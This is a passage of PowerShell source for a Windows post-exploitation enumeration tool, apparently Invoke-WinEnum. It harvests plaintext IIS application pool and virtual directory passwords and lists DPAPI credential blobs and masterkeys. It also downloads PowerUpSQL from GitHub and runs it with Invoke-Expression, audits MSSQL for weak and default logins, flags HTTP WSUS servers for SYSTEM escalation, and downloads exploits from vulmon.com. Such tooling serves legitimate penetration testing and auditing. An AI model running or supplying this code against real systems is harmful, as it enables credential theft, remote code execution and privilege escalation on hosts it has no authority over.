            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Invoke-DefenderEnum {
    $Defender = Get-WmiObject -Class Win32_Service  -Filter "Name='WinDefend'"
    if($Defender){
        if(Get-Module -Name defender -ListAvailable){
            try{
                import-module -name Defender -Force -ErrorAction Stop
            }catch{
                Write-Output "[-] Could import Windows Defender module"
                return
            }
            Get-MpComputerStatus
            Get-MpPreference
            $table = @{
                MalwareDetected = (Get-MpThreatDetection).count
                MalwareRemoved = (Get-MpThreatDetection).ActionSuccess.count
                Top5MalwareProcess = (((Get-MpThreatDetection).ProcessName | Group-Object -NoElement  | Sort-Object -Property count -Descending | Select-Object -First 5).name -join ', ')
                Top5MalwareUser = (((Get-MpThreatDetection).DomainUser | Group-Object -NoElement  | Sort-Object -Property count -Descending | Select-Object -First 5).name -join ', ')
            }
            New-Object -TypeName PSobject -Property $table | Select-Object MalwareDetected,MalwareRemoved,Top5MalwareProcess,Top5MalwareUser
        }else{
            Write-Output "[-] Could not find Windows Defender module"
        }
    }
}
function Invoke-ExtendedEnum {
    <#
    Checking Installed Software
    if mssql is installed download PowerUpSQL.ps1 and audit the databases
    if IIS is installed audit WebConfig and Application host pool
    if Server or DC, Enumerate Windows Defender
    #>
    param(
        [string]
        $PowerUpSQL='https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1'
    )
    $mssql = Get-WmiObject -Class Win32_Service  -Filter "Name='MSSQLSERVER'"
    if($mssql){
        Write-Output "[*] Starting MSSQL Audit"
        try{
            Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PowerUpSQL)
            $check = $true
        }catch{
            Write-Output "[-] Invoke-Expression (New-Object net.webclient).DownloadString Failed"
        }
        if(-not($check)){
            try{
                Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri $PowerUpSQL -ErrorAction Stop).content 
                $check = $true
            }catch{
                Write-Output "[-] Invoke-Expression Invoke-WebRequest Failed"
            }
        }
        if($check){
            $instances = Get-SQLInstanceLocal | Select-Object instance | Sort-Object -Unique 
            foreach($Instance in $instances){
                $instanceinfo = $instance | Get-SQLServerInfo
                if($instanceinfo){
                        Write-Output "`n[*] MSSQL Info"
                        $instanceinfo | Format-List
                        Write-Output "[*] MSSQL Links"
                        $instanceinfo | Get-SQLServerLinkCrawl  | Format-List
                        Write-Output "[*] MSSQL Users"
                        $instanceinfo | Get-SQLServerRoleMember | Format-List
                        #test if SQL Server is configured with default passwords.
                        $instanceinfo | Invoke-SQLAuditDefaultLoginPw | Format-List
                        # enumerateSQL Server logins and the current login and test for "username" as password for each enumerated login.
                        $instanceinfo | Invoke-SQLAuditWeakLoginPw | Format-List
                        #Check if any SQL Server links are configured with remote credentials.
                        $instanceinfo | Invoke-SQLAuditPrivServerLink  | Format-List
                        #Check if any databases have been configured as trustworthy
                        $instanceinfo | Invoke-SQLAuditPrivTrustworthy | Format-List
                        #Check if data ownership chaining is enabled at the server or databases levels.
                        $instanceinfo | Invoke-SQLAuditPrivDbChaining | Format-List
                        #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
                        $instanceinfo | Invoke-SQLAuditSQLiSpExecuteAs | Format-List
                        #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
                        $instanceinfo | Invoke-SQLAuditSQLiSpSigned | Format-List
                        #heck if any databases have been configured as trustworthy.
                        $instanceinfo | Invoke-SQLAuditPrivAutoExecSp | Format-List
                        #Non default database status
                        $instanceinfo | Get-SQLDatabase -NoDefaults | Format-List
                        #acl for database path
                        $instanceinfo | Get-SQLDatabase | Sort-Object -Unique -Property FileName | foreach {Get-ModifiablePath -Path $_.FileName -ErrorAction Continue | Format-List}
                        #search database for keywords in non default databases
                        #$instanceinfo | Get-SQLColumnSampleDataThreaded -Threads 20 -Keyword "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults | Format-List
                }else{
                    Write-Output "[-] Cant Enumerate Instance $($Instance.Instance)"
                }
            }
        }
    }
    $iis = Get-WmiObject -Class Win32_Service  -Filter "Name='W3svc'"
    if($iis){
        Write-Output "`n[*] Starting IIS testing"
        #https://powersploit.readthedocs.io/en/latest/Privesc/Get-WebConfig/
        Write-Output "[*] Checking WebConfig"
        try{
            $WebConfig = Get-WebConfig -ErrorAction Stop
            if($WebConfig){
                Write-Output "[-] WebConfig Credentials Found"
                $WebConfig
            }else{
                Write-Output "[+] No WebConfig Credentials Found"
            }
        }catch{
            Write-Output "[-] WebConfig Failed"
        }
        #https://powersploit.readthedocs.io/en/latest/Privesc/Get-ApplicationHost/
        Write-Output "[*] Checking Application Pool"
        try{
            $ApplicationHost = Get-ApplicationHost -ErrorAction Stop
            if($ApplicationHost){
                Write-Output "[-] ApplicationHost Credentials Found"
                $ApplicationHost
            }else{
                Write-Output "[+] No ApplicationHost Credentials Found"
            }
        }catch{
            Write-Output "[-] ApplicationHost Failed"
        }
    }
}
function Get-DPAPIBlobs {
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause
    .DESCRIPTION
    Enumerate DPAPI blobs and masterkeys
    #>
    [CmdletBinding()]
    Param()
    $blobs=@()
    foreach($user in ((Get-ChildItem C:\users).fullname)){
        try{
            $blobs += Get-ChildItem $user\AppData\Local\Microsoft\Credentials\ -h -ErrorAction SilentlyContinue
            $blobs += Get-ChildItem $user\AppData\Roaming\Microsoft\Credentials\ -h -ErrorAction SilentlyContinue
        }catch{
            Write-Verbose "Access Denied $user"
        }
    }
    try{
        $blobs += Get-ChildItem $env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Credentials -h -ErrorAction SilentlyContinue
    }catch{
        Write-Verbose "Failed accessing System DPAPI"
    }
    foreach($blob in $blobs){
        try{
            $bytes = [System.IO.File]::ReadAllBytes($blob.fullname)
            $offset = $bytes[56..(56+4)]
            $desc = [System.Text.Encoding]::Unicode.GetString($bytes, 60,([bitconverter]::ToInt32($offset,0)))
            [byte[]]$Masterkeybytes = $bytes[36..(36+15)]
            [string]$Masterkey = [guid]::new($Masterkeybytes)
            [pscustomobject]@{
                Directory = $blob.Directory
                name = $blob.name
                Description = $desc.Replace([environment]::NewLine , '')
                Masterkey = $Masterkey
                CreationTime = $blob.CreationTime
                LastAccessTime = $blob.LastAccessTime
                SizeKB = [math]::Round($blob.length / 1kb)}
        }catch{
            Write-Verbose "Failed enumerating blob $blob.fullname"
        }
    }
}
function Get-HttpWSUSServers {
    <#
    .SYNOPSIS
        Checks if the host recieves Windows updates over HTTP

        Author: Lee Christensen
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        
    .DESCRIPTION
        This function checks to see if the host recieves Windows updates over HTTP.
        If so, one can escalate privileges by changing the host's proxy to point to an
        attacker's server.  The attacker can then trigger a Windows update, man in the
        middle the traffic, and serve a malicious exe that will execute as SYSTEM.
    
    .EXAMPLE
        > Get-HttpWSUSServers
        Gets HTTP Windows Update servers
    
    .LINK
        https://github.com/ctxis/wsuspect-proxy
        https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update-wp.pdf

    #>

    [CmdletBinding()]
    Param()

    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
    $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

    if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) {
        New-Object PSObject -Property @{
            WUServer = $WUServer
        }
    }
}
function Invoke-Vulmap {
    <#
.SYNOPSIS
Online Local vulnerability Scanner
.DESCRIPTION
Gets installed software information from the local host and asks to vulmon.com if vulnerabilities and exploits exists. 
.PARAMETER Mode
Mode. Conducts a vulnerability scanning[Default] or [CollectInventory]
.PARAMETER OnlyExploitableVulns
Conducts a vulnerability scanning and only shows vulnerabilities that have exploits.
.PARAMETER DownloadExploit
Downloads given exploit.
.PARAMETER DownloadAllExploits
Scans the computer and downloads all available exploits.
.PARAMETER ReadInventoryFile
Uses software inventory file rather than scanning local computer.
.PARAMETER SaveInventoryFile
Saves software inventory file. Enabled automatically when Mode is 'CollectInventory'.
.PARAMETER InventoryInFile
Input JSON file name referred by SaveInventoryFile. Default is 'inventory.json'.
.PARAMETER InventoryOutFile
Output JSON file name referred by ReadInventoryFile. Default is 'inventory.json'.
.PARAMETER Proxy
Specifies an HTTP proxy server. Enter the URI of a network proxy server. (-Proxy http://localhost:8080)
.EXAMPLE
PS> Invoke-Vulmap
Default mode. Conducts a vulnerability scanning.
.EXAMPLE
PS> Invoke-Vulmap -OnlyExploitableVulns
Conducts a vulnerability scanning and only shows vulnerabilities that have exploits.
.EXAMPLE
PS> Invoke-Vulmap -DownloadExploit EDB9386
Downloads given exploit.
.EXAMPLE
PS> Invoke-Vulmap -DownloadAllExploits
Scans the computer and downloads all available exploits.
.EXAMPLE
PS> Invoke-Vulmap -Mode CollectInventory
Collects software inventory but does not conduct a vulnerability scanning.
Software inventory will be saved as 'inventory.json' in default.
.EXAMPLE
PS> Invoke-Vulmap -Mode CollectInventory -InventoryOutFile pc0001.json
Collects software inventory and save it with given file name.
Does not conduct a vulnerability scanning.
.EXAMPLE
PS> Invoke-Vulmap -SaveInventoryFile
Conducts a vulnerability scanning and saves software inventory to inventory.json file.
.EXAMPLE
PS> Invoke-Vulmap -SaveInventoryFile -InventoryOutFile pc0001.json
Conducts a vulnerability scanning and saves software inventory to given file name.
.EXAMPLE
PS> Invoke-Vulmap -ReadInventoryFile
Conducts a vulnerability scanning based on software inventory from file.
Software inventory will be loaded from 'inventory.json' in default.
.EXAMPLE
PS> Invoke-Vulmap -ReadInventoryFile -InventoryInFile pc0001.json
Conducts a vulnerability scanning based on software inventory file loaded from given file name.
.EXAMPLE
PS> Invoke-Vulmap -Proxy http://127.0.0.1:8080
Conducts a vulnerability scanning through an HTTP proxy server.
.LINK
https://github.com/vulmon
https://vulmon.com
#>

    Param (
        [string] $Mode = "default",
        [switch] $OnlyExploitableVulns,
        [string] $DownloadExploit = "",
        [switch] $DownloadAllExploits,
        [switch] $SaveInventoryFile,
        [switch] $ReadInventoryFile,
        [string] $InventoryOutFile = "inventory.json",
        [string] $InventoryInFile = "inventory.json",
        [string] $Proxy,
        [switch] $Help
    )

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
    function Send-Request($ProductList) {
        $product_list = '"product_list": ' + $ProductList;
        
        $json_request_data = '{';
        $json_request_data = $json_request_data + '"os": "' + (Get-CimInstance Win32_OperatingSystem).Caption + '",';
        $json_request_data = $json_request_data + $product_list;
        $json_request_data = $json_request_data + '}';

        $postParams = @{querydata = $json_request_data };

        if (![string]::IsNullOrEmpty($Proxy))
        {
            return (Invoke-WebRequest -Uri https://vulmon.com/scannerapi_vv211 -Method POST -Body $postParams -Proxy $Proxy).Content;
        }
        else {
            return (Invoke-WebRequest -Uri https://vulmon.com/scannerapi_vv211 -Method POST -Body $postParams).Content;
        }
    }
    function Get-ProductList() {
        $registry_paths = ("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall");
   
        $objectArray = @();
    
        foreach ($registry_path in $registry_paths) {
            
            if ([bool](Get-ChildItem -Path $registry_path -ErrorAction SilentlyContinue)) {
            
                $subkeys = Get-ChildItem -Path $registry_path;
    
                ForEach ($key in $subkeys) {
                    $DisplayName = $key.getValue('DisplayName');
    
                    if (!([string]::IsNullOrEmpty($DisplayName))) {
                        $DisplayVersion = $key.GetValue('DisplayVersion');
    
                        $Object = [pscustomobject]@{ 
                            DisplayName     = $DisplayName.Trim();
                            DisplayVersion  = $DisplayVersion;
                            NameVersionPair = $DisplayName.Trim() + $DisplayVersion;
                        };
    
                        $Object.pstypenames.insert(0, 'System.Software.Inventory');
    
                        $objectArray += $Object;
                    }
                }                   
            }               
        }

        $objectArray | sort-object NameVersionPair -unique;
    }   
    function Get-Exploit($ExploitID) {  
	    if (![string]::IsNullOrEmpty($Proxy))
        {
			$request1 = Invoke-WebRequest -Uri ('https://vulmon.com/downloadexploit?qid=' + $ExploitID) -Proxy $Proxy -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0";
			Invoke-WebRequest -Uri ('https://vulmon.com/downloadexploit?qid=' + $ExploitID) -Proxy $Proxy -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" -OutFile ( ($request1.Headers."Content-Disposition" -split "=")[1].substring(1));
		}
		else
		{
			$request1 = Invoke-WebRequest -Uri ('https://vulmon.com/downloadexploit?qid=' + $ExploitID) -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0";
			Invoke-WebRequest -Uri ('https://vulmon.com/downloadexploit?qid=' + $ExploitID) -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" -OutFile ( ($request1.Headers."Content-Disposition" -split "=")[1].substring(1));
		}
    }
    function Get-Vulmon($product_list) {
        $response = (Send-Request -ProductList $product_list | ConvertFrom-Json);
        $interests = @();
        foreach ($vuln in $response.results) {
            
            if ($OnlyExploitableVulns -Or $DownloadAllExploits) {
                $interests += $vuln | Select-Object -Property query_string -ExpandProperty vulnerabilities | where-object { $_.exploits -ne $null } | `
                    Select-Object -Property @{N = 'Product'; E = { $_.query_string } }, @{N = 'CVE ID'; E = { $_.cveid } }, @{N = 'Risk Score'; E = { $_.cvssv2_basescore } }, @{N = 'Vulnerability Detail'; E = { $_.url } }, @{L = 'ExploitID'; E = { if ($null -ne $_.exploits) { "EDB" + ($_.exploits[0].url).Split("{=}")[2] }else { null } } }, @{L = 'Exploit Title'; E = { if ($null -ne $_.exploits) { $_.exploits[0].title }else { null } } };

                if ($DownloadAllExploits) {    
                    foreach ($exp in $interests) {
                        $exploit_id = $exp.ExploitID;
                        Get-Exploit($exploit_id);                     
                    }
                }
            }
            else {
                $interests += $vuln | Select-Object -Property query_string -ExpandProperty vulnerabilities | `
                    Select-Object -Property @{N = 'Product'; E = { $_.query_string } }, @{N = 'CVE ID'; E = { $_.cveid } }, @{N = 'Risk Score'; E = { $_.cvssv2_basescore } }, @{N = 'Vulnerability Detail'; E = { $_.url } }, @{L = 'Exploit ID'; E = { if ($null -ne $_.exploits) { "EDB" + ($_.exploits[0].url).Split("{=}")[2] }else { null } } }, @{L = 'Exploit Title'; E = { if ($null -ne $_.exploits) { $_.exploits[0].title }else { null } } };
            }
        }
        return $interests;
    }
    function Invoke-VulnerabilityScan() {
        Write-Host 'Vulnerability scanning started...';
        $inventory = ConvertFrom-Json($inventory_json);

        $vuln_list = @();
        $count = 0;
        foreach ($element in $inventory) {
            # Build JSON from inventory
            if ($element.DisplayName) {
                $product_list = $product_list + '{';
                $product_list = $product_list + '"product": "' + $element.DisplayName + '",';
                $product_list = $product_list + '"version": "' + $element.DisplayVersion + '"';
                $product_list = $product_list + '},';
            }
                   
            $count++;
            if (($count % 100) -eq 0) {
                $product_list = $product_list.Substring(0, $product_list.Length - 1);
                $http_param = '[' + $product_list + ']';
                $http_response = Get-Vulmon($http_param);
                $vuln_list += $http_response;
                $product_list = "";
            }
        }
        $product_list = $product_list.Substring(0, $product_list.Length - 1);
        $http_param = '[' + $product_list + ']';
        $http_response = Get-Vulmon($http_param);
        $vuln_list += $http_response;
        Write-Host "Checked $count items";

        if ($vuln_list.Length -eq 0) {
            Write-Host 'No vulnerabilities found';
        } else {
            $vuln_count = $vuln_list.Length;
            Write-Host "$vuln_count vulnerabilities found!";
            $vuln_list | Format-Table -AutoSize;
        }
    }
    function Get-Inventory{
        if ($ReadInventoryFile) {
            # read from file
            Write-Host "Reading software inventory from $InventoryInFile...";
            $inventory_json = Get-Content -Encoding UTF8 -Path $InventoryInFile | Out-String;
        } else {
            Write-Host "Collecting software inventory...";
            $inventory = Get-ProductList;
            $inventory_json = ConvertTo-JSON $inventory;
        }
        Write-Host 'Software inventory collected';
        return $inventory_json;

    }
    <#-----------------------------------------------------------[Execution]------------------------------------------------------------#>
    Write-Host 'Vulmap started...';
    if (!([string]::IsNullOrEmpty($DownloadExploit))) {
        "Downloading exploit...";
        Get-Exploit($DownloadExploit);
    }
    else {
        $inventory_json = Get-Inventory;
        # Save Inventory to File
        if (($SaveInventoryFile) -Or ($Mode -eq "CollectInventory")) {
            Write-Host "Saving software inventory to $InventoryOutFile... ";
            $inventory_json | Out-File -Encoding UTF8 -FilePath $InventoryOutFile;
            }

        if (!($Mode -eq "CollectInventory")){
           # Mode 'Default'
           invoke-VulnerabilityScan;
         }
    }
    Write-Host 'Done.';
}
function Invoke-WinEnum {
    param(
        [switch]$Extended
    )
    #Start timer
    $timer = [Diagnostics.Stopwatch]::StartNew()

    #Get Local admins for acl checking
    $LocalAdmins = Get-LocalAdministrators
    $Admins = @(
        'System'
        'TrustedInstaller'
        'CREATOR OWNER'
        'Skapare ägare'
        'ägare'
        'skapare'
        'Administrators'
        'Administratörer'
        $LocalAdmins.name
    )

    
    Write-Output "`n[*] Checking System Information"
    try{
        Get-SysInfo
    }catch{
        Write-Output "[-] SysInfo Failed"
    }

    #
    Write-Output "[*] Checking Local Security Products"
    try{
        Get-LocalSecurityProducts
    }catch{
        Write-Output "[-] Local Security Products Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAutoLogon/
    Write-Output "`n[*] Checking AutoLogon"
    try{
        $autologon = Get-RegistryAutoLogon -ErrorAction Stop
        if($autologon){
            Write-Output "[-] AutoLogon Credentials Found"
            $autologon | fl *
        }else{
            Write-Output "[+] No AutoLogon Credentials Found"
        }
    }catch{
        Write-Output "[-] AutoLogon Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-CachedGPPPassword/
    Write-Output "`n[*] Checking CachedGPPPassword"
    try{
        $CachedGPPPassword = Get-CachedGPPPassword -ErrorAction Stop
        if($CachedGPPPassword){
            Write-Output "[-] CachedGPPPassword Found"
            $CachedGPPPassword  | fl *
        }else{
            Write-Output "[+] No CachedGPPPassword Found"
        }
    }catch{
        Write-Output "[-] CachedGPPPassword Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnattendedInstallFile/
    Write-Output "`n[*] Checking UnattendedInstallFiles"
    try{
        $UnattendedInstallFile = Get-UnattendedInstallFile -ErrorAction Stop
        if($UnattendedInstallFile){
            Write-Output "[-] UnattendedInstallFiles Found"
            $UnattendedInstallFile  | fl *
        }else{
            Write-Output "[+] No UnattendedInstallFiles Found"
        }
    }catch{
        Write-Output "[-] UnattendedInstallFiles Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnquotedService/
    Write-Output "`n[*] Checking Unquoted Services"
    try{
        $UnquotedService = Get-UnquotedService -ErrorAction Stop -SkipUser $Admins
        if($UnquotedService){
            Write-Output "[-] Unquoted Services Found"
            $UnquotedService  | fl *
        }else{
            Write-Output "[+] No Unquoted Services Found"
        }
    }catch{
        Write-Output "[-] Unquoted Services Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAlwaysInstallElevated/
    Write-Output "`n[*] Checking AlwaysInstallElevated"
    try{
        $AlwaysInstallElevated = Get-RegistryAlwaysInstallElevated -ErrorAction Stop
        if($AlwaysInstallElevated){
            Write-Output "[-] AlwaysInstallElevated Found"
            $AlwaysInstallElevated  | fl *
        }else{
            Write-Output "[+] No AlwaysInstallElevated Found"
        }
    }catch{
        Write-Output "[-] AlwaysInstallElevated Failed"
    }

    #
    Write-Output "`n[*] Checking UAC Configuration"
    try{
        Get-UACLevel
    }catch{
        Write-Output "[-] Checking for UAC Configuration Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Local Shares"
    try{
        Get-LocalShares
    }catch{
        Write-Output "[-] Checking for ACL's on Local Shares Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Scheduled Tasks Binaries and Folders"
    try{
        Get-WritableScheduledTasks -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking ACL on Scheduled Tasks Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Folders in Admins PATH"
    try{
        Get-WritableAdminPath -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking Admins PATH Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Services Binaries and Folders"
    try{
        Get-WritableServices -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking Services Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on AutoRuns Binaries and Folders"
    try{
        Get-WritableAutoRuns -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking AutoRuns Failed"
    }
    
    #
    Write-Output "`n[*] Checking Active Listenings Ports"
    try{
        Get-ActiveListeners | Format-Table
    }catch{
        Write-Output "[-] Checking Active Listenings Failed"
    }
    
    #
    Write-Output "[*] Checking Installed Software"
    try{
        (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | where {$_.DisplayName} | Select-Object DisplayName, Publisher, InstallDate)
    }catch{
        Write-Output "[-] Checking Installed Software failed"
    }

    #
    Write-Output "`n[*] Checking Non standard services"
    try{
        Get-NonstandardService | Format-List *
    }catch{
        Write-Output "[-] Checking non stand services Failed"
    }

    #
    Write-Output "`n[*] Checking wpad and spooler status"
    try{
        (Get-WmiObject -Class Win32_Service  -Filter "Name='Spooler' or Name='WinHttpAutoProxySvc'") |Format-Table Name,DisplayName,Status,State,StartMode
    }catch{
        Write-Output "[-] Checking spooler and wpad status failed"
    }

    #
    Write-Output "`n[*] Checking Non standard processes"
    try{
        Get-Process -IncludeUserName -ErrorAction SilentlyContinue | where {$_.path -and $_.company -notmatch '^Microsoft.*'} |select Handles,Id,Username,Path
    }catch{
        Get-Process -ErrorAction SilentlyContinue | where {$_.path -and $_.company -notmatch '^Microsoft.*'} | select Handles,Id,Path
    }

    #
    #Write-Output "`n[*] Checking credentials in registry"
    #Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -ErrorAction SilentlyContinue

    #
    #Write-Output "`n[*] Checking for sensitive files in C:\Users\"
    #get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | foreach{$_.FullName }
    
    #
    Write-Output "`n[*] Checking Security Updates"
    try{
        (Get-WmiObject -Class "win32_quickfixengineering" -Filter 'Description="Security Update"') | ft -AutoSize
    }catch{
        Write-Output "[-] Checking security updates failed"
    }

    #
    Write-Output "`n[*] Checking DPAPI blobs"
    try{
        Get-DPAPIBlobs | where {[int]$_.SizeKB -gt 1} | fl *
    }catch{
        Write-Output "[-] Checking dpapi blobs failed"
    }

    #
    Write-Output "`n[*] Checking for HTTP WSUS servers"
    try{
        Get-HttpWSUSServers | fl *
    }catch{
        Write-Output "[-] Checking wsus server failed"
    }

    #
    $role = (get-wmiObject -Class Win32_ComputerSystem).DomainRole
    if($role -ge 2){
        Write-Output '[*]Starting best practice analyzer'
        (Get-WindowsFeature | where {$_.BestPracticesModelId -and $_.installed} ).BestPracticesModelId | foreach {Invoke-BpaModel -BestPracticesModelId $_ -ErrorAction SilentlyContinue}
        (Get-WindowsFeature | where {$_.BestPracticesModelId -and $_.installed} ).BestPracticesModelId | foreach {Get-BpaResult -BestPracticesModelId $_ -ErrorAction SilentlyContinue} | where { -not $_.Compliance} | fl *
    }
    
    #
    if($extended){
        Write-Output "`n[*] Doing extended testing.."
        try{
            Invoke-ExtendedEnum -PowerUpSQL 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1'
        }catch{
            Write-Output "[-] Extended testing failed"
        }
        
        Write-Output "`n[*] Checking for vulnerable software.."
        try{
            Invoke-Vulmap
        }catch{
            Write-Output "[-] vulmap failed"
        }
        
        Write-Output "`n[*] Checking for sensitive logs.."
        Invoke-EventLogParser -All
        
        Write-Output "`n[*] Checking for dotnet services.."
        try{
            Get-DotNetServices 
        }catch{
            Write-Output "[-] dotnet services failed"
        }
    }
    Write-Output "Scan took $($timer.Elapsed.TotalSeconds) Seconds"
    $timer.Stop()
}
#Invoke-WinEnum -Extended
#Invoke-WinEnum